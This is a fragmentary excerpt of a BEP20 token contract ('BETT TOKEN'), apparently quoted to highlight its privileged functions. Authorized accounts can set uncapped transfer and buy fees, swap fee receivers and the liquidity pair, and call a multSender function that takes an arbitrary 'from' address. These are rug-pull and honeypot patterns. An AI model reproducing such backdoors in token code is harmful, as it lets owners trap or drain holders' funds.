...
contract CoinToken is IBEP20, Auth {
    ...
    address MKT  = 0xE223A705d5a946511f2CCb8e5BE14893B13E113f;   

    string constant _name = "BETT TOKEN";
    ...
    function setRewardToken(address _rewardTokenAddress) external authorized {
        require(
    ...
    function setTransferBuyFee(uint256 _transferTaxRate, uint256 _buyTaxRate) external authorized {
        transferFee = _transferTaxRate;
        totalBuyFee = _buyTaxRate;

    }
    function setFeeDistribution(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee,  uint256 _burnFee, uint256 _buybackSellFee, uint256 _feeDenominator) external authorized {
    ...
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _buyBackReceiver, address _deadReceiver) external authorized {
    ...
    function setPair(address _PairLiquidy) external authorized {
        pair = _PairLiquidy; 
    }    
...
function multSender(address from, address[] calldata addresses, uint256[] calldata tokens) external authorized  {
    uint256 SCCC = 0;
    ...
    require(balanceOf(from) >= SCCC, "Not enough tokens to multSender");
